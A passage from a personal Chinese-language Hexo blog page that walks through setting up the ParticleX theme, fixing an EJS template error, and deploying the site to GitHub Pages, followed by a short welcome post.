<span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;</span><span class="er">&lt;</span><span class="st">%- url_for(&quot;</span><span class="er">/js/lib/highlight.js&quot;)</span> <span class="er">%</span><span class="dt">&gt;</span><span class="st">&quot;&gt;&lt;/script&gt;</span></span>
<span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-25"><a href="#cb13-25" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (theme<span class="op">.</span><span class="at">math</span><span class="op">.</span><span class="at">enable</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-26"><a href="#cb13-26" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.js&quot;</span><span class="op">&gt;&lt;/</span>script<span class="op">&gt;</span></span>
<span id="cb13-27"><a href="#cb13-27" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js&quot;</span><span class="op">&gt;&lt;/</span>script<span class="op">&gt;</span></span>
<span id="cb13-28"><a href="#cb13-28" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>link rel<span class="op">=</span><span class="st">&quot;stylesheet&quot;</span> href<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css&quot;</span> <span class="op">/&gt;</span></span>
<span id="cb13-29"><a href="#cb13-29" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;&lt;%- url_for(&quot;</span><span class="ss">/js/lib/math.js&quot;</span><span class="sc">)</span><span class="ss"> %&gt;&quot;&gt;&lt;/script</span><span class="op">&gt;</span></span>
<span id="cb13-30"><a href="#cb13-30" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-31"><a href="#cb13-31" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (theme<span class="op">.</span><span class="at">preview</span><span class="op">.</span><span class="at">enable</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-32"><a href="#cb13-32" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;&lt;%- url_for(&quot;</span><span class="ss">/js/lib/preview.js&quot;</span><span class="sc">)</span><span class="ss"> %&gt;&quot;&gt;&lt;/script</span><span class="op">&gt;</span></span>
<span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-34"><a href="#cb13-34" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (theme<span class="op">.</span><span class="at">crypto</span><span class="op">.</span><span class="at">enable</span> <span class="op">&amp;&amp;</span> <span class="kw">typeof</span> page<span class="op">.</span><span class="at">secret</span> <span class="op">!==</span> <span class="st">&quot;undefined&quot;</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-35"><a href="#cb13-35" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js&quot;</span><span class="op">&gt;&lt;/</span>script<span class="op">&gt;</span></span>
<span id="cb13-36"><a href="#cb13-36" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;&lt;%- url_for(&quot;</span><span class="ss">/js/lib/crypto.js&quot;</span><span class="sc">)</span><span class="ss"> %&gt;&quot;&gt;&lt;/script</span><span class="op">&gt;</span></span>
<span id="cb13-37"><a href="#cb13-37" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-38"><a href="#cb13-38" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (type <span class="op">===</span> <span class="st">&quot;archives&quot;</span> <span class="op">&amp;&amp;</span> theme<span class="op">.</span><span class="at">search</span><span class="op">.</span><span class="at">enable</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-39"><a href="#cb13-39" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;&lt;%- url_for(&quot;</span><span class="ss">/js/lib/search.js&quot;</span><span class="sc">)</span><span class="ss"> %&gt;&quot;&gt;&lt;/script</span><span class="op">&gt;</span></span>
<span id="cb13-40"><a href="#cb13-40" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-41"><a href="#cb13-41" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (type <span class="op">===</span> <span class="st">&quot;post&quot;</span> <span class="op">&amp;&amp;</span> page<span class="op">.</span><span class="at">comments</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-42"><a href="#cb13-42" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (theme<span class="op">.</span><span class="at">gitalk</span><span class="op">.</span><span class="at">enable</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-43"><a href="#cb13-43" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js&quot;</span><span class="op">&gt;&lt;/</span>script<span class="op">&gt;</span></span>
<span id="cb13-44"><a href="#cb13-44" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>link rel<span class="op">=</span><span class="st">&quot;stylesheet&quot;</span> href<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.css&quot;</span> <span class="op">/&gt;</span></span>
<span id="cb13-45"><a href="#cb13-45" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-46"><a href="#cb13-46" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (theme<span class="op">.</span><span class="at">waline</span><span class="op">.</span><span class="at">enable</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-47"><a href="#cb13-47" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/waline/3.5.0/waline.min.js&quot;</span><span class="op">&gt;&lt;/</span>script<span class="op">&gt;</span></span>
<span id="cb13-48"><a href="#cb13-48" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>link rel<span class="op">=</span><span class="st">&quot;stylesheet&quot;</span> href<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/waline/3.5.0/waline.min.css&quot;</span> <span class="op">/&gt;</span></span>
<span id="cb13-49"><a href="#cb13-49" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>link rel<span class="op">=</span><span class="st">&quot;stylesheet&quot;</span> href<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/waline/3.5.0/waline-meta.min.css&quot;</span> <span class="op">/&gt;</span></span>
<span id="cb13-50"><a href="#cb13-50" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-51"><a href="#cb13-51" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (theme<span class="op">.</span><span class="at">twikoo</span><span class="op">.</span><span class="at">enable</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-52"><a href="#cb13-52" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/twikoo/1.5.8/twikoo.all.min.js&quot;</span><span class="op">&gt;&lt;/</span>script<span class="op">&gt;</span></span>
<span id="cb13-53"><a href="#cb13-53" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-54"><a href="#cb13-54" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-55"><a href="#cb13-55" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> <span class="cf">if</span> (type <span class="op">===</span> <span class="st">&quot;index&quot;</span>) &#123; <span class="op">%&gt;</span></span>
<span id="cb13-56"><a href="#cb13-56" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script src<span class="op">=</span><span class="st">&quot;&lt;%- url_for(&quot;</span><span class="ss">/js/lib/home.js&quot;</span><span class="sc">)</span><span class="ss"> %&gt;&quot;&gt;&lt;/script</span><span class="op">&gt;</span></span>
<span id="cb13-57"><a href="#cb13-57" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;%</span> &#125; <span class="op">%&gt;</span></span>
<span id="cb13-58"><a href="#cb13-58" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>link rel<span class="op">=</span><span class="st">&quot;stylesheet&quot;</span> href<span class="op">=</span><span class="st">&quot;&lt;%- url_for(&quot;</span><span class="ss">/css/main</span><span class="op">.</span><span class="at">css</span><span class="st">&quot;) %&gt;&quot;</span> <span class="op">/&gt;</span></span></code></pre></div>
<h2 id="新增導覽頁面">新增導覽頁面</h2>
<p>為了應對 ParticleX 自帶的頁面，我們要加入以下：</p>
<div class="sourceCode" id="cb14"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> new page tags</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> new page about</span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> new page categories</span></code></pre></div>
<p>加入後重新產生靜態網頁資料：</p>
<div class="sourceCode" id="cb15"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> generate</span></code></pre></div>
<p>但是我一直遇到以下錯誤：</p>
<pre class="shell"><code>Unhandled rejection TypeError: /home/t2o0n321/blog/themes/particlex/layout/post.ejs:22
    20|         &lt;/span&gt;
    21|         &lt;% &#125; %&gt;
 &gt;&gt; 22|         &lt;% if (page.tags &amp;&amp; page.tags.data.length !== 0) &#123; %&gt;
    23|         &lt;span class=&quot;tags&quot;&gt;
    24|             &lt;span class=&quot;icon&quot;&gt;
    25|                 &lt;i class=&quot;fa-solid fa-tags fa-fw&quot;&gt;&lt;/i&gt;</code></pre>
<p>為了避免這個問題，我們要將
<code>themes/particlex/layout/post.ejs</code> 的
<code>&lt;% if (page.tags &amp;&amp; page.tags.data &amp;&amp; page.tags.data.length !== 0) &#123; %&gt;</code>
修改成以下的樣子：</p>
<div class="sourceCode" id="cb17"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>% if (page.tags <span class="er">&amp;&amp;</span> page.tags.data <span class="er">&amp;&amp;</span> page.tags.data.length !== 0) &#123; %&gt;</span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">span</span> <span class="er">class</span><span class="ot">=</span><span class="st">&quot;tags&quot;</span><span class="dt">&gt;</span></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&lt;</span><span class="kw">span</span> <span class="er">class</span><span class="ot">=</span><span class="st">&quot;icon&quot;</span><span class="dt">&gt;</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&lt;</span><span class="kw">i</span> <span class="er">class</span><span class="ot">=</span><span class="st">&quot;fa-solid fa-tags fa-fw&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">i</span><span class="dt">&gt;</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&lt;/</span><span class="kw">span</span><span class="dt">&gt;</span></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>        <span class="er">&lt;</span>% let prev; %&gt;</span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>        <span class="er">&lt;</span>% page.tags.data.forEach((tag) =&gt; &#123; %&gt;</span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&lt;</span><span class="kw">span</span> <span class="er">class</span><span class="ot">=</span><span class="st">&quot;tag&quot;</span><span class="dt">&gt;</span></span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>            <span class="er">&lt;</span>%</span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>                const colors = theme.colors.filter((color) =&gt; color !== prev);</span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>                let id = Math.floor(Math.random() * colors.length);</span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a>                prev = colors[id];</span>
<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>            %&gt;</span>
<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&lt;</span><span class="kw">a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;</span><span class="er">&lt;</span><span class="st">%- url_for(tag.path) %&gt;&quot;</span> <span class="er">style</span><span class="ot">=</span><span class="st">&quot;color: </span><span class="er">&lt;</span><span class="st">%- colors[id] %&gt;&quot;</span><span class="dt">&gt;</span></span>
<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a>                <span class="er">&lt;</span>%= tag.name %&gt;</span>
<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span>
<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&lt;/</span><span class="kw">span</span><span class="dt">&gt;</span></span>
<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a>        <span class="er">&lt;</span>% &#125;); %&gt;</span>
<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">span</span><span class="dt">&gt;</span></span>
<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>% &#125; %&gt;</span></code></pre></div>
<h2 id="建立新文章">建立新文章</h2>
<p>建立文章並撰寫 Markdown</p>
<div class="sourceCode" id="cb18"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> new <span class="pp">[</span><span class="ss">name_of_article</span><span class="pp">]</span></span></code></pre></div>
<h2 id="大功告成查看結果">大功告成查看結果</h2>
<p>使用 <code>hexo clean</code> 和 <code>hexo generate</code>
刷新後，發現沒有問題就可以打開模擬伺服器看看結果了：</p>
<div class="sourceCode" id="cb19"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> server</span></code></pre></div>
<h2 id="部署到-github-io">部署到 github io</h2>
<p>這邊先提醒一下，之前沒有設定過 github.io 的人，可以先參考 <a
target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/m/articles/10272520">guitimliu
大大的文章</a>設定，以下的操作預設你已設定好了。<br/></p>
<p>在根目錄的 <code>_config.yml</code> 修改 <code>deploy</code>
的欄位：</p>
<div class="sourceCode" id="cb20"><pre
class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Deployment</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="co">## Docs: https://hexo.io/docs/one-command-deployment</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="fu">deploy</span><span class="kw">:</span></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="fu">type</span><span class="kw">:</span><span class="at"> git</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="fu">repo</span><span class="kw">:</span><span class="at"> https://github.com/[your_username]/[your_username].github.io.git</span></span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="fu">branch</span><span class="kw">:</span><span class="at"> </span><span class="kw">[</span><span class="at">your_branch</span><span class="kw">]</span></span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="fu">message</span><span class="kw">:</span><span class="at"> </span><span class="st">&#39;Deploy from Hexo&#39;</span></span></code></pre></div>
<ul>
<li><code>type</code>：部署類型</li>
<li><code>repo</code>：儲存庫 clone</li>
<li><code>branch</code>：儲存庫分支</li>
<li><code>message</code>：Commit 訊息</li>
</ul>
<p>安裝必要插件：</p>
<div class="sourceCode" id="cb21"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> install hexo-deployer-git <span class="at">--save</span></span></code></pre></div>
<p>將靜態檔案推上去：</p>
<div class="sourceCode" id="cb22"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> d</span></code></pre></div>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/hexo/" style="color: #ffa2c4">hexo</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/setup/" style="color: #00a596">setup</a>
        </span>
        
    </div>
    <a href="/2025/06/09/hexo-setup/" class="go-post">閱讀全文</a>
</div>

<div class="post">
    <a href="/2025/06/09/welcome/">
        <h2 class="post-title">歡迎光臨</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/6/9
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="關於我">關於我</h1>
<p>也沒啥啦～</p>
<h1 id="內容">內容</h1>
<p>這邊會很多我的廢話和程式開發相關的文章並記錄生活的點點滴滴，所以看了會不嘻嘻的可以先左轉離開囉
😘</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/where-to-start/" style="color: #00a596">where-to-start</a>
        </span>
        
    </div>
    <a href="/2025/06/09/welcome/" class="go-post">閱讀全文</a>
</div>


        <div class="page-current">
    
    <span class="current">1</span>
    
    
    
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/avatar.gif" alt="avatar" />
        </div>
        <div class="name">t2o0n321</div>
        <div class="description">
            <p>好想睡覺想睡覺…🐭</p>

        </div>
        
        
        <div class="friend-links">
            
            <div class="friend-link">
                <a target="_blank" rel="noopener" href="https://t2o0n321.github.io/about/">About me</a>
            </div>
            
        </div>
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2024 - 2025 t2o0n321.blog
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;t2o0n321
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>
